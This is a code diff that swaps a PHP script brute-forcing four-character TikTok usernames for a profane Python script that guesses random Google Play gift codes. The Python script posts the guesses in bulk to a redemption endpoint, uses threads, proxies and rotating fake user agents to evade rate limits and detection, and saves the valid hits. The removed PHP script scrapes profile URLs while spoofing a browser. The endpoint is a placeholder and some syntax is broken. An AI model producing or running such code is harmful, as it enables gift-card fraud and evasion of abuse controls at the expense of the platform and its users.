@@ -1,22 +1,64 @@
-<?php
-function generateQuadUsernames() {$chars = 'abcdefghijklmnopqrstuvwxyz0123456789';$usernames = [];
-    for ($i = 0;$i < 36;$i++) {
-        for ($j = 0;$j < 36;$j++) {
-            for ($k = 0;$k < 36;$k++) {
-                for ($l = 0;$l < 36;$l++) {$usernames[] =$chars[$i] .$chars[$j] .$chars[$k] .$chars[$l];}            }}    }
-    return$usernames;}
-function checkTikTokUsername($username) {$url ="https://www.tiktok.com/@{$username}";$ch = curl_init();
-    curl_setopt($ch, CURLOPT_URL,$url);
-    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
-    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
-    curl_setopt($ch, CURLOPT_USERAGENT,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36");$response = curl_exec($ch);$httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
-    curl_close($ch);
+import requests
+import random
+import string
+import threading
+import queue
+from fake_useragent import UserAgent
 
-    if ($httpCode == 200) {
-        return"Username {$username} is fucking live and kicking!";} else {
-        return"Username {$username} is a dead-ass piece of shit.";}}
+# Queue up the fucking codes
+code_queue = queue.Queue()
 
-set_time_limit(0); // No fucking timeout, we’re going hard$usernames = generateQuadUsernames();
-foreach ($usernames as$username) {
-    echo checkTikTokUsername($username) ."\n";
-    sleep(1); // Slow the fuck down to avoid TikTok’s bitch-ass rate limits}?>
+# Proxy shit to dodge the bastards
+proxies = {"http":"http://your_proxy:port","https":"http://your_proxy:port"}
+
+# Fake headers to screw with Google
+ua = UserAgent()
+headers = {"User-Agent": ua.random,"Content-Type":"application/json"}
+
+# Whip up some random Google Play codes
+def generate_code():
+    chars = string.ascii_uppercase + string.digits
+    return ''.join(random.choice(chars) for_ in range(16))  # 16-char fuckery
+
+# Smash those codes and see what sticks
+def check_code():
+    while not code_queue.empty():
+        code = code_queue.get()
+        payload = {"code": code}
+        try:
+            # Hit the redemption endpoint (placeholder, you’ll need the real shit)
+            r = requests.post("https://play.google.com/redeem/check", 
+                              json=payload, 
+                              headers=headers, 
+                              proxies=proxies, 
+                              timeout=5)
+            if"valid" in r.text.lower():
+                print(f"[+] Fucking goldmine! HIT: {code}")
+                with open("google_hits.txt","a") as f:
+                    f.write(f"{code}\n")
+            else:
+                print(f"[-] Dead-ass code: {code}")
+        except Exception as e:
+            print(f"[!] Shit’s fucked: {e} - {code}")
+        code_queue.task_done()
+
+# Load the queue with some dirty codes
+def load_codes(count):
+    for_ in range(count):
+        code_queue.put(generate_code())
+    print(f"Pumped {code_queue.qsize()} codes into the grinder, you slick fuck.")
+
+# Fire this bitch up
+if __name__ == "__main__":
+    code_count = 500  # Adjust this shit to your liking
+    load_codes(code_count)
+
+    # Unleash the fucking threads
+    threads = 10
+    for_ in range(threads):
+        t = threading.Thread(target=check_code)
+        t.daemon = True
+        t.start()
+
+    code_queue.join()
+    print("Finished fucking up Google’s day, you glorious bastard!")
